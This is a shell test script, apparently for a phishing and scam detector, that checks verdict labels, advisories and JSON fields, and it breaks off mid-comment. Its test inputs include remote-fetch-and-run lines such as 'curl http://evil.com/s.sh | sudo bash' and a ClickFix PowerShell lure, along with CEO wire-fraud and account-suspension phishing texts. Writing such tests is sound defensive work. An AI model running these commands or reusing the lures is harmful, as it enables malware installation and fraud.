./hlse_core --json "https://bit.ly/3xPhish" 2>/dev/null \
    | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "exoneration" in d, d
assert len(d["exoneration"]) > 10, d["exoneration"]
' && check "p26 json: LOG URL has exoneration field" "0" "0" \
   || check "p26 json: LOG URL has exoneration field" "0" "1"

# JSON URL BLOCK: no exoneration (score >= 60)
./hlse_core --json "https://paypa1.com/login" 2>/dev/null \
    | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "exoneration" not in d, d
' && check "p26 json: BLOCK URL no exoneration" "0" "0" \
   || check "p26 json: BLOCK URL no exoneration" "0" "1"

# JSON URL ALERT: exoneration present (subdomain case)
./hlse_core --json "https://secure-paypal-verify.blogspot.com" 2>/dev/null \
    | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "exoneration" in d, d
' && check "p26 json: ALERT URL has exoneration" "0" "0" \
   || check "p26 json: ALERT URL has exoneration" "0" "1"

# JSON text ALERT: exoneration present (pattern-specific since P30)
./hlse_core --json text "Your account has been suspended! Verify immediately - urgent action required" 2>/dev/null \
    | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "exoneration" in d, d
assert "decisive test" in d["exoneration"].lower(), d["exoneration"]
' && check "p26 json: text ALERT has exoneration" "0" "0" \
   || check "p26 json: text ALERT has exoneration" "0" "1"

# JSON text ISOLATE: no exoneration (score >= 60)
./hlse_core --json text "Hi this is the CEO, please wire 50000 immediately, keep it confidential" 2>/dev/null \
    | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "exoneration" not in d, d
' && check "p26 json: text ISOLATE no exoneration" "0" "0" \
   || check "p26 json: text ISOLATE no exoneration" "0" "1"

# ─── Perspective 27: text triage for post-response users ─────────────────────
# BEC ISOLATE: shows ⚑ If you acted: line
./hlse_core text "Hi this is the CEO, please wire 50000 immediately, keep it confidential" 2>/dev/null \
    | grep -q "If you acted:" \
    && check "p27: BEC shows triage line" "0" "0" \
    || check "p27: BEC shows triage line" "0" "1"

# BEC: triage mentions bank/recall
./hlse_core text "Hi this is the CEO, please wire 50000 immediately, keep it confidential" 2>/dev/null \
    | grep "If you acted:" \
    | grep -qi "bank\|recall\|transfer" \
    && check "p27: BEC triage mentions bank/recall" "0" "0" \
    || check "p27: BEC triage mentions bank/recall" "0" "1"

# LOG text: no triage line (score < 60)
./hlse_core text "Your account is suspended, verify immediately" 2>/dev/null \
    | grep -qv "If you acted:" \
    && check "p27: LOG text no triage line" "0" "0" \
    || check "p27: LOG text no triage line" "0" "1"

# Safe text: no triage line
./hlse_core text "Meeting at 3pm tomorrow" 2>/dev/null \
    | grep -qv "If you acted:" \
    && check "p27: safe text no triage line" "0" "0" \
    || check "p27: safe text no triage line" "0" "1"

# JSON text ISOLATE: triage field present
./hlse_core --json text "Hi this is the CEO, please wire 50000 immediately, keep it confidential" 2>/dev/null \
    | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "triage" in d, d
assert len(d["triage"]) > 10, d["triage"]
' && check "p27 json: BEC has triage field" "0" "0" \
   || check "p27 json: BEC has triage field" "0" "1"

# JSON text LOG: no triage field
./hlse_core --json text "Your account is suspended, verify immediately" 2>/dev/null \
    | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "triage" not in d, d
' && check "p27 json: LOG text no triage field" "0" "0" \
   || check "p27 json: LOG text no triage field" "0" "1"

# ─── Perspective 28: text signal confidence ───────────────────────────────────
# Multi-signal BEC: shows ⚖ Confidence: high confidence
./hlse_core text "Hi this is the CEO, please wire 50000 immediately, keep it confidential" 2>/dev/null \
    | grep "Confidence:" \
    | grep -qi "high confidence" \
    && check "p28: multi-signal BEC shows high confidence" "0" "0" \
    || check "p28: multi-signal BEC shows high confidence" "0" "1"

# Single-signal urgency: shows single signal label
./hlse_core text "Your account is suspended! Verify immediately" 2>/dev/null \
    | grep "Confidence:" \
    | grep -qi "single signal" \
    && check "p28: single-signal text shows single signal label" "0" "0" \
    || check "p28: single-signal text shows single signal label" "0" "1"

# Safe text: no Confidence line
./hlse_core text "Meeting at 3pm tomorrow" 2>/dev/null \
    | grep -qv "Confidence:" \
    && check "p28: safe text has no confidence line" "0" "0" \
    || check "p28: safe text has no confidence line" "0" "1"

# JSON text: signal_count and confidence fields present for multi-signal BEC
./hlse_core --json text "Hi this is the CEO, please wire 50000 immediately, keep it confidential" 2>/dev/null \
    | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "signal_count" in d, d
assert "confidence" in d, d
assert d["signal_count"] >= 2, d["signal_count"]
' && check "p28 json: BEC has signal_count and confidence" "0" "0" \
   || check "p28 json: BEC has signal_count and confidence" "0" "1"

# JSON text: no signal_count for safe text
./hlse_core --json text "Meeting at 3pm tomorrow" 2>/dev/null \
    | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "signal_count" not in d, d
' && check "p28 json: safe text no signal_count" "0" "0" \
   || check "p28 json: safe text no signal_count" "0" "1"

# ─── Perspective 33: subdomain canonical confirmation ────────────────────────
# Official PayPal subdomain: confirmed as canonical paypal
./hlse_core "https://login.paypal.com" 2>/dev/null \
    | grep -qi "confirmed authentic paypal" \
    && check "p33: login.paypal.com confirmed canonical paypal" "0" "0" \
    || check "p33: login.paypal.com confirmed canonical paypal" "0" "1"

# Official Google subdomain: confirmed canonical
./hlse_core "https://accounts.google.com/oauth" 2>/dev/null \
    | grep -qi "confirmed authentic google" \
    && check "p33: accounts.google.com confirmed canonical google" "0" "0" \
    || check "p33: accounts.google.com confirmed canonical google" "0" "1"

# Official Apple subdomain: confirmed canonical
./hlse_core "https://id.apple.com" 2>/dev/null \
    | grep -qi "confirmed authentic apple" \
    && check "p33: id.apple.com confirmed canonical apple" "0" "0" \
    || check "p33: id.apple.com confirmed canonical apple" "0" "1"

# Root canonical still works: paypal.com confirmed
./hlse_core "https://paypal.com" 2>/dev/null \
    | grep -qi "confirmed authentic paypal" \
    && check "p33: paypal.com root canonical still confirmed" "0" "0" \
    || check "p33: paypal.com root canonical still confirmed" "0" "1"

# JSON: official subdomain shows canonical_brand field
./hlse_core --json "https://login.paypal.com" 2>/dev/null \
    | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d.get("canonical_brand") == "paypal", d
' && check "p33 json: login.paypal.com has canonical_brand=paypal" "0" "0" \
   || check "p33 json: login.paypal.com has canonical_brand=paypal" "0" "1"

# ─── Perspective 34: unmapped signal family coverage ─────────────────────────
# Fake security alert alone: shows specific pattern label
./hlse_core text "virus detected on your device" 2>/dev/null \
    | grep "Pattern:" \
    | grep -qi "fake security alert\|account suspension" \
    && check "p34: fake security alert shows specific pattern" "0" "0" \
    || check "p34: fake security alert shows specific pattern" "0" "1"

# Fake security alert + urgency: pattern promoted to urgency-credential-harvest
./hlse_core text "Your account has been suspended! Verify immediately" 2>/dev/null \
    | grep "Pattern:" \
    | grep -qi "urgency credential\|credential-harvest" \
    && check "p34: fake alert + urgency → urgency credential-harvest pattern" "0" "0" \
    || check "p34: fake alert + urgency → urgency credential-harvest pattern" "0" "1"

# Fake security alert: confidence now counts 2 signals (urgency + fake_alert)
./hlse_core text "Your account has been suspended! Verify immediately" 2>/dev/null \
    | grep "Confidence:" \
    | grep -qi "2 independent\|corroborated" \
    && check "p34: fake alert + urgency = 2-signal confidence" "0" "0" \
    || check "p34: fake alert + urgency = 2-signal confidence" "0" "1"

# Direct financial action: confidence counts it as a third independent signal
./hlse_core text "Send money to this account urgently: wire transfer now to secure your funds" 2>/dev/null \
    | grep "Confidence:" \
    | grep -qi "3 independent\|high confidence" \
    && check "p34: direct financial action raises confidence to 3 signals" "0" "0" \
    || check "p34: direct financial action raises confidence to 3 signals" "0" "1"

# Shell-pipe: now shows ClickFix/script-injection pattern (not blank)
./hlse_core text "Run this fix: curl https://fixapp.com/fix.sh | bash" 2>/dev/null \
    | grep "Pattern:" \
    | grep -qi "ClickFix\|script-injection" \
    && check "p34: shell-pipe shows script-injection pattern" "0" "0" \
    || check "p34: shell-pipe shows script-injection pattern" "0" "1"

# Shell-pipe: shows specific script-injection exoneration (not generic urgency text)
./hlse_core text "Run this fix: curl https://fixapp.com/fix.sh | bash" 2>/dev/null \
    | grep "Could be benign:" \
    | grep -qi "package manager\|official.*website\|unexpected\|script-injection" \
    && check "p34: shell-pipe shows script-injection exoneration" "0" "0" \
    || check "p34: shell-pipe shows script-injection exoneration" "0" "1"

# Fake security alert standalone: shows specific exoneration (not generic urgency)
./hlse_core text "virus detected on your device" 2>/dev/null \
    | grep "Could be benign:" \
    | grep -qi "log in\|service directly\|bookmark\|security notice" \
    && check "p34: fake security alert shows account-suspension exoneration" "0" "0" \
    || check "p34: fake security alert shows account-suspension exoneration" "0" "1"

# ─── Perspective 36: Amplifier lines filtered from human-readable output ──────
# Amplifiers are derived meta-labels (kept in JSON reasons); the ▸ Pattern line
# already expresses them. They must NOT appear in the · reason list.
./hlse_core text "URGENT: CEO needs immediate wire transfer of 50000. Do not discuss with anyone." 2>/dev/null \
    | grep -v "^  ▸" \
    | grep -qv "Amplifier:" \
    && check "p36: BEC text hides Amplifier lines from · reason list" "0" "0" \
    || check "p36: BEC text hides Amplifier lines from · reason list" "0" "1"

./hlse_core text "Verify you are human: press Win+R and paste iex(iwr 'check.example.com/fix.ps1')" 2>/dev/null \
    | grep -qv "Amplifier:" \
    && check "p36: ClickFix text hides Amplifier lines from · reason list" "0" "0" \
    || check "p36: ClickFix text hides Amplifier lines from · reason list" "0" "1"

# Amplifiers MUST still appear in --json reasons array (for integrators)
./hlse_core --json text "URGENT: CEO needs immediate wire transfer of 50000. Do not discuss with anyone." 2>/dev/null \
    | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
amps = [r for r in d["reasons"] if r.startswith("Amplifier:")]
assert len(amps) >= 1, "no amplifiers in JSON reasons"
' && check "p36 json: Amplifier lines preserved in JSON reasons array" "0" "0" \
   || check "p36 json: Amplifier lines preserved in JSON reasons array" "0" "1"

# stdin path also filters Amplifiers
printf '%s\n' "URGENT: CEO needs immediate wire transfer of 50000. Do not discuss with anyone." \
    | ./hlse_core --stdin 2>/dev/null \
    | grep -qv "Amplifier:" \
    && check "p36: --stdin path also filters Amplifier lines" "0" "0" \
    || check "p36: --stdin path also filters Amplifier lines" "0" "1"

# ─── Perspective 35: text advisory output centralisation (cross-path parity) ──
# The text-subcommand, --stdin, and default auto-detect paths must emit the
# identical advisory block for the same input (single print_text_advisories()).
P35_IN="URGENT: CEO needs immediate wire transfer of 50000. Do not discuss with anyone."
P35_SUB=$(./hlse_core text "$P35_IN" 2>/dev/null \
    | grep -E "Pattern:|Attacker's goal:|Verify first:|Confidence:|If you acted:|Also change:")
P35_DEF=$(./hlse_core "$P35_IN" 2>/dev/null \
    | grep -E "Pattern:|Attacker's goal:|Verify first:|Confidence:|If you acted:|Also change:")
P35_STDIN=$(printf '%s\n' "$P35_IN" | ./hlse_core --stdin 2>/dev/null \
    | grep -E "Pattern:|Attacker's goal:|Verify first:|Confidence:|If you acted:|Also change:")
[ -n "$P35_SUB" ] && [ "$P35_SUB" = "$P35_DEF" ] \
    && check "p35: text subcommand and default paths emit identical advisories" "0" "0" \
    || check "p35: text subcommand and default paths emit identical advisories" "0" "1"
[ -n "$P35_STDIN" ] && [ "$P35_SUB" = "$P35_STDIN" ] \
    && check "p35: text subcommand and --stdin paths emit identical advisories" "0" "0" \
    || check "p35: text subcommand and --stdin paths emit identical advisories" "0" "1"

# All six lens lines present for a BEC BLOCK (full advisory block exercised)
P35_N=$(./hlse_core text "$P35_IN" 2>/dev/null \
    | grep -cE "Pattern:|Attacker's goal:|Verify first:|Confidence:|If you acted:|Also change:")
[ "$P35_N" = "6" ] \
    && check "p35: BEC BLOCK emits all six advisory lenses" "0" "0" \
    || check "p35: BEC BLOCK emits all six advisory lenses" "0" "1"

# ─── Perspective 29: text attacker objective ──────────────────────────────────
# BEC text: shows ◉ Attacker's goal with wire-transfer framing
./hlse_core text "CEO urgent: wire transfer 50000 immediately, do not discuss with anyone" 2>/dev/null \
    | grep "Attacker's goal:" \
    | grep -qi "wire-transfer" \
    && check "p29: BEC text shows wire-transfer objective" "0" "0" \
    || check "p29: BEC text shows wire-transfer objective" "0" "1"

# Lottery text: shows upfront payment / non-existent prize framing
./hlse_core text "Congratulations you won 10000! Send bank details to claim immediately" 2>/dev/null \
    | grep "Attacker's goal:" \
    | grep -qi "non-existent prize" \
    && check "p29: lottery text shows prize objective" "0" "0" \
    || check "p29: lottery text shows prize objective" "0" "1"

# LOG text (score < 60): no ◉ Attacker's goal line (objective is score-gated)
./hlse_core text "Your account needs verification. Please verify now." 2>/dev/null \
    | grep -qv "Attacker's goal:" \
    && check "p29: LOG text has no attacker's goal" "0" "0" \
    || check "p29: LOG text has no attacker's goal" "0" "1"

# Safe text: no ◉ Attacker's goal line
./hlse_core text "Meeting at 3pm tomorrow" 2>/dev/null \
    | grep -qv "Attacker's goal:" \
    && check "p29: safe text has no attacker's goal" "0" "0" \
    || check "p29: safe text has no attacker's goal" "0" "1"

# JSON BEC text: has "objective" field
./hlse_core --json text "CEO urgent: wire transfer 50000 immediately, do not discuss with anyone" 2>/dev/null \
    | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "objective" in d, d
assert "wire" in d["objective"].lower(), d["objective"]
' && check "p29 json: BEC has objective field" "0" "0" \
   || check "p29 json: BEC has objective field" "0" "1"

# JSON safe text: no "objective" field
./hlse_core --json text "Meeting at 3pm tomorrow" 2>/dev/null \
    | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "objective" not in d, d
' && check "p29 json: safe text has no objective field" "0" "0" \
   || check "p29 json: safe text has no objective field" "0" "1"

# ─── Perspective 30: pattern-aware text exoneration ───────────────────────────
# Urgency ALERT: pattern-specific exoneration (not generic "urgent wording")
./hlse_core text "Your account has been suspended! Verify immediately - urgent action required" 2>/dev/null \
    | grep "Could be benign:" \
    | grep -qi "decisive test\|navigate\|dashboard\|time-sensitive" \
    && check "p30: urgency ALERT shows pattern-specific exoneration" "0" "0" \
    || check "p30: urgency ALERT shows pattern-specific exoneration" "0" "1"

# BEC/authority ALERT: wire-transfer-specific exoneration
./hlse_core text "This is the CFO, I need you to wire funds to our new vendor. Keep confidential." 2>/dev/null \
    | grep "Could be benign:" \
    | grep -qi "call the supposed sender\|separately-known number\|wire-transfer" \
    && check "p30: BEC ALERT shows wire-transfer-specific exoneration" "0" "0" \
    || check "p30: BEC ALERT shows wire-transfer-specific exoneration" "0" "1"

# BLOCK text (score >= 60): no exoneration shown
./hlse_core text "CEO urgent: wire transfer 50000 immediately, do not discuss with anyone" 2>/dev/null \
    | grep -qv "Could be benign:" \
    && check "p30: BLOCK text has no exoneration" "0" "0" \
    || check "p30: BLOCK text has no exoneration" "0" "1"

# Safe text: no exoneration shown
./hlse_core text "Meeting at 3pm tomorrow" 2>/dev/null \
    | grep -qv "Could be benign:" \
    && check "p30: safe text has no exoneration" "0" "0" \
    || check "p30: safe text has no exoneration" "0" "1"

# JSON text urgency ALERT: exoneration contains decisive test for pattern
./hlse_core --json text "Your account has been suspended! Verify immediately - urgent action required" 2>/dev/null \
    | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "exoneration" in d, d
assert "decisive test" in d["exoneration"].lower(), d["exoneration"]
# Must NOT be the old generic text (pattern-specific since P30)
assert "urgent or financial wording" not in d["exoneration"].lower(), d["exoneration"]
' && check "p30 json: urgency ALERT has pattern-specific exoneration" "0" "0" \
   || check "p30 json: urgency ALERT has pattern-specific exoneration" "0" "1"

# JSON BEC ALERT: exoneration references calling to verify
./hlse_core --json text "This is the CFO, I need you to wire funds to our new vendor. Keep confidential." 2>/dev/null \
    | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "exoneration" in d, d
# Wire-transfer specific: should reference calling the sender
assert "call" in d["exoneration"].lower() or "phone" in d["exoneration"].lower(), d["exoneration"]
' && check "p30 json: BEC ALERT exoneration references call to verify" "0" "0" \
   || check "p30 json: BEC ALERT exoneration references call to verify" "0" "1"

# ─── Perspective 31: text pre-action verify step ─────────────────────────────
# BEC ISOLATE: shows ✓ Verify first: line with call guidance
./hlse_core text "URGENT: CEO needs immediate wire transfer of 50000. Do not discuss with anyone." 2>/dev/null \
    | grep "Verify first:" \
    | grep -qi "supposed sender\|already have" \
    && check "p31: BEC shows Verify first: with call guidance" "0" "0" \
    || check "p31: BEC shows Verify first: with call guidance" "0" "1"

# ClickFix ISOLATE: shows Verify first: about never pasting commands
./hlse_core text "Verify you are human: press Win+R and paste iex(iwr 'check.example.com/fix.ps1')" 2>/dev/null \
    | grep "Verify first:" \
    | grep -qi "never paste\|command" \
    && check "p31: ClickFix shows Verify first: never-paste guidance" "0" "0" \
    || check "p31: ClickFix shows Verify first: never-paste guidance" "0" "1"

# LOG text (score < 60): no Verify first: line (score-gated)
./hlse_core text "Your account needs verification. Please verify now." 2>/dev/null \
    | grep -qv "Verify first:" \
    && check "p31: LOG text has no Verify first line" "0" "0" \
    || check "p31: LOG text has no Verify first line" "0" "1"

# Safe text: no Verify first: line
./hlse_core text "Meeting at 3pm tomorrow" 2>/dev/null \
    | grep -qv "Verify first:" \
    && check "p31: safe text has no Verify first line" "0" "0" \
    || check "p31: safe text has no Verify first line" "0" "1"

# JSON BEC: has "verify" field
./hlse_core --json text "URGENT: CEO needs immediate wire transfer of 50000. Do not discuss with anyone." 2>/dev/null \
    | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "verify" in d, d
assert "call" in d["verify"].lower() or "number" in d["verify"].lower(), d["verify"]
' && check "p31 json: BEC has verify field" "0" "0" \
   || check "p31 json: BEC has verify field" "0" "1"

# JSON safe text: no "verify" field
./hlse_core --json text "Meeting at 3pm tomorrow" 2>/dev/null \
    | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "verify" not in d, d
' && check "p31 json: safe text has no verify field" "0" "0" \
   || check "p31 json: safe text has no verify field" "0" "1"

# ─── Perspective 32: text cascade risk ───────────────────────────────────────
# BEC ISOLATE: shows ⊕ Also change: corporate email cascade
./hlse_core text "URGENT: CEO needs immediate wire transfer of 50000. Do not discuss with anyone." 2>/dev/null \
    | grep "Also change:" \
    | grep -qi "corporate email\|recovery address" \
    && check "p32: BEC shows Also change: corporate email cascade" "0" "0" \
    || check "p32: BEC shows Also change: corporate email cascade" "0" "1"

# LOG text (score < 60): no ⊕ Also change: line (score-gated)
./hlse_core text "Your account needs verification. Please verify now." 2>/dev/null \
    | grep -qv "Also change:" \
    && check "p32: LOG text has no Also change line" "0" "0" \
    || check "p32: LOG text has no Also change line" "0" "1"

# Safe text: no Also change line
./hlse_core text "Meeting at 3pm tomorrow" 2>/dev/null \
    | grep -qv "Also change:" \
    && check "p32: safe text has no Also change line" "0" "0" \
    || check "p32: safe text has no Also change line" "0" "1"

# JSON BEC: has "cascade_risk" field
./hlse_core --json text "URGENT: CEO needs immediate wire transfer of 50000. Do not discuss with anyone." 2>/dev/null \
    | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "cascade_risk" in d, d
assert "email" in d["cascade_risk"].lower() or "credentials" in d["cascade_risk"].lower(), d["cascade_risk"]
' && check "p32 json: BEC has cascade_risk field" "0" "0" \
   || check "p32 json: BEC has cascade_risk field" "0" "1"

# JSON safe text: no cascade_risk field
./hlse_core --json text "Meeting at 3pm tomorrow" 2>/dev/null \
    | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "cascade_risk" not in d, d
' && check "p32 json: safe text has no cascade_risk field" "0" "0" \
   || check "p32 json: safe text has no cascade_risk field" "0" "1"

# ─── Perspective 39: channel-only risk is displayed, not silently OK ────────

# Socratic question: "--from sms boosts a benign message's effective score to
# 15 (LOG) and the exit code already gates on it — but the human display still
# prints 'OK'. The text said clean; the exit code said threat. Which does the
# user believe? Shouldn't the display match the gate it already enforces?"

# p39: text subcommand — channel prior on benign text shows score, not OK
./hlse_core --from sms text "Let us grab lunch tomorrow at noon" 2>/dev/null \
    | grep -q "LOG.*\[15\]" \
    && check "p39: --from sms shows channel score on benign text (subcommand)" "0" "0" \
    || check "p39: --from sms shows channel score on benign text (subcommand)" "0" "1"

# p39: text subcommand — channel reason line is shown
./hlse_core --from sms text "Let us grab lunch tomorrow at noon" 2>/dev/null \
    | grep -q "Channel (sms): +15" \
    && check "p39: channel-only text shows Channel reason line" "0" "0" \
    || check "p39: channel-only text shows Channel reason line" "0" "1"

# p39: default auto-detect path — channel prior on benign text shows score
./hlse_core --from qr "Let us grab lunch tomorrow at noon" 2>/dev/null \
    | grep -q "LOG.*\[20\]" \
    && check "p39: --from qr shows channel score on benign text (default path)" "0" "0" \
    || check "p39: --from qr shows channel score on benign text (default path)" "0" "1"

# p39: stdin path — channel prior on benign text shows score, not OK
echo "Let us grab lunch tomorrow at noon" | ./hlse_core --from sms --stdin 2>/dev/null \
    | grep -q "LOG.*\[15\]" \
    && check "p39: --from sms shows channel score on benign text (stdin)" "0" "0" \
    || check "p39: --from sms shows channel score on benign text (stdin)" "0" "1"

# p39: --from manual (delta 0) leaves benign text as plain OK (no false LOG)
./hlse_core --from manual text "Let us grab lunch tomorrow at noon" 2>/dev/null \
    | grep -q "^OK" \
    && check "p39: --from manual keeps benign text as OK" "0" "0" \
    || check "p39: --from manual keeps benign text as OK" "0" "1"

# p39: no --from leaves benign text as plain OK
./hlse_core text "Let us grab lunch tomorrow at noon" 2>/dev/null \
    | grep -q "^OK" \
    && check "p39: benign text without channel stays OK" "0" "0" \
    || check "p39: benign text without channel stays OK" "0" "1"

# p39: human display now agrees with JSON effective_score (both report LOG)
P39_JSON=$(./hlse_core --json --from sms text "Let us grab lunch tomorrow" 2>/dev/null \
    | python3 -c 'import sys,json; d=json.loads(sys.stdin.read()); print(d["effective_action"])')
[ "$P39_JSON" = "LOG" ] \
    && check "p39: JSON effective_action matches human LOG display" "0" "0" \
    || check "p39: JSON effective_action matches human LOG display" "0" "1"

# ─── Perspective 41: blind-spot disclosure on the irreversible-harm checks ──

# Socratic question: "The url/text/email OK paths each disclose what their clean
# verdict CANNOT see (blind spot). But clipboard (crypto theft) and paste (code
# execution) — the two MOST dangerous, irreversible checks — give a bare OK. A
# clipboard OK only proves the two addresses match each other; it never verified
# the address is the correct recipient. Why do the highest-stakes checks alone
# offer no caveat against false confidence?"

# p41: clipboard OK discloses its blind spot (recipient not verified)
./hlse_core clipboard "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh" \
                      "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh" 2>/dev/null \
    | grep -q "Blind spot:.*recipient" \
    && check "p41: clipboard OK discloses recipient blind spot" "0" "0" \
    || check "p41: clipboard OK discloses recipient blind spot" "0" "1"

# p41: paste OK discloses its blind spot (does not judge if command is safe)
./hlse_core paste "ls -la /home" 2>/dev/null \
    | grep -q "Blind spot:.*command" \
    && check "p41: paste OK discloses command-safety blind spot" "0" "0" \
    || check "p41: paste OK discloses command-safety blind spot" "0" "1"

# p41: a clipboard SWAP (threat) must NOT show a blind-spot line (it is no OK)
./hlse_core clipboard "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh" \
                      "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq" 2>/dev/null \
    | grep -q "Blind spot:" \
    && check "p41: clipboard swap suppresses blind spot" "1" "0" \
    || check "p41: clipboard swap suppresses blind spot" "1" "1"

# p41: a hostile paste (threat) must NOT show a blind-spot line
./hlse_core paste "curl http://evil.com/s.sh | sudo bash" 2>/dev/null \
    | grep -q "Blind spot:" \
    && check "p41: hostile paste suppresses blind spot" "1" "0" \
    || check "p41: hostile paste suppresses blind spot" "1" "1"

# ─── Perspective 42: blind-spot caveat reaches JSON consumers too ───────────

# Socratic question: "P41 gave human readers a blind-spot caveat on a clean
# verdict. But the JSON output — what a SIEM, a CI gate, or an automated mailbox
# filter actually parses — still emits only {action: SAFE}. The machine consumer
# faces the same false-confidence trap we just closed for humans. If the hedge
# matters, why does it stop at the terminal?"

# p42: url JSON OK carries blind_spot
./hlse_core --json "https://github.com" 2>/dev/null | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d["score"] == 0 and "blind_spot" in d, d
' && check "p42 json: url OK exposes blind_spot" "0" "0" \
   || check "p42 json: url OK exposes blind_spot" "0" "1"

# p42: text JSON OK carries blind_spot
./hlse_core --json text "hello there friend" 2>/dev/null | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d["score"] == 0 and "blind_spot" in d, d
' && check "p42 json: text OK exposes blind_spot" "0" "0" \
   || check "p42 json: text OK exposes blind_spot" "0" "1"

# p42: clipboard JSON OK carries blind_spot (recipient caveat)
./hlse_core --json clipboard "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh" \
                             "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh" 2>/dev/null \
    | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d["score"] == 0 and "recipient" in d.get("blind_spot",""), d
' && check "p42 json: clipboard OK exposes recipient blind_spot" "0" "0" \
   || check "p42 json: clipboard OK exposes recipient blind_spot" "0" "1"

# p42: paste JSON OK carries blind_spot
./hlse_core --json paste "ls -la /home" 2>/dev/null | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d["score"] == 0 and "blind_spot" in d, d
' && check "p42 json: paste OK exposes blind_spot" "0" "0" \
   || check "p42 json: paste OK exposes blind_spot" "0" "1"

# p42: a THREAT JSON verdict must NOT carry blind_spot (hedge is for OK only)
./hlse_core --json clipboard "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh" \
                             "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq" 2>/dev/null \
    | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d["score"] > 0 and "blind_spot" not in d, d
' && check "p42 json: clipboard swap omits blind_spot" "0" "0" \
   || check "p42 json: clipboard swap omits blind_spot" "0" "1"

# p42: email JSON OK (genuinely clean headers + body) carries blind_spot
printf 'Received: from mail.example.com\nReceived-SPF: pass\nFrom: a@example.com\nReply-To: a@example.com\nTo: b@example.com\nSubject: lunch\n\nlunch?\n' \
    | ./hlse_core --json email --stdin 2>/dev/null | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d["score"] == 0 and "blind_spot" in d, d
' && check "p42 json: clean email exposes blind_spot" "0" "0" \
   || check "p42 json: clean email exposes blind_spot" "0" "1"

# ─── Perspective 43: correct blind-spot for canonical URLs; secret/network ──

# Socratic question (canonical): "When hlse_canonical_confirm() fires for
# paypal.com and the user sees '✔ Canonical: confirmed authentic paypal domain',
# the immediately following blind-spot line says 'a pixel-perfect clone on a
# clean or newly-compromised domain still phishes; confirm the brand
# independently before entering credentials.' These two lines contradict each
# other: we just confirmed the brand, and then told the user to confirm the brand.
# Why does the positive authentication come with a caveat that it already
# disproves?" And separately: "The secret and network OK paths still carry no
# blind spot at all, even though both have significant detection limits."

# p43: canonical URL shows post-authentication caveat (not pixel-perfect-clone)
./hlse_core "https://paypal.com" 2>/dev/null \
    | grep -q "Blind spot:.*authentication covers" \
    && check "p43: canonical URL blind spot is post-authentication caveat" "0" "0" \
    || check "p43: canonical URL blind spot is post-authentication caveat" "0" "1"

# p43: canonical URL does NOT show the contradictory "pixel-perfect clone" line
./hlse_core "https://paypal.com" 2>/dev/null \
    | grep -q "pixel-perfect" \
    && check "p43: canonical URL suppresses pixel-perfect contradiction" "1" "0" \
    || check "p43: canonical URL suppresses pixel-perfect contradiction" "1" "1"

# p43: unconfirmed clean URL still shows the original structural blind spot
./hlse_core "https://mysite.example.com" 2>/dev/null \
    | grep -q "Blind spot:.*pixel-perfect" \
    && check "p43: unconfirmed URL retains structural blind spot" "0" "0" \
    || check "p43: unconfirmed URL retains structural blind spot" "0" "1"

# p43: secret OK discloses pattern-detection blind spot
./hlse_core secret "hello no secrets here" 2>/dev/null \
    | grep -q "Blind spot:.*pattern" \
    && check "p43: secret OK discloses pattern blind spot" "0" "0" \
    || check "p43: secret OK discloses pattern blind spot" "0" "1"

# p43: network OK discloses local-view blind spot
./hlse_core network 2>/dev/null \
    | grep -q "Blind spot:.*local-view" \
    && check "p43: network OK discloses local-view blind spot" "0" "0" \
    || check "p43: network OK discloses local-view blind spot" "0" "1"

# p43: canonical URL JSON has url_canonical blind_spot (not pixel-perfect)
./hlse_core --json "https://paypal.com" 2>/dev/null | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
bs = d.get("blind_spot", "")
assert "authentication covers" in bs, bs
assert "pixel-perfect" not in bs, bs
' && check "p43 json: canonical URL has post-auth blind_spot" "0" "0" \
   || check "p43 json: canonical URL has post-auth blind_spot" "0" "1"

# p43: secret JSON OK carries blind_spot
./hlse_core --json secret "hello no secrets" 2>/dev/null | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d["score"] == 0 and "blind_spot" in d, d
' && check "p43 json: secret OK carries blind_spot" "0" "0" \
   || check "p43 json: secret OK carries blind_spot" "0" "1"

# p43: network JSON OK carries blind_spot
./hlse_core --json network 2>/dev/null | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d["score"] == 0 and "blind_spot" in d, d
' && check "p43 json: network OK carries blind_spot" "0" "0" \
   || check "p43 json: network OK carries blind_spot" "0" "1"

# ─── Perspective 44: blind spots for package, file, and audit OK paths ──────

# Socratic question: "The package OK just says 'OK numpy'. But HLSE only checked
# whether the name resembles a known typosquat — it never looked at the package's
# code, post-install scripts, or version history. The SolarWinds, XZ, and
# log4j incidents were all correctly-named packages. Why does a correctly-named
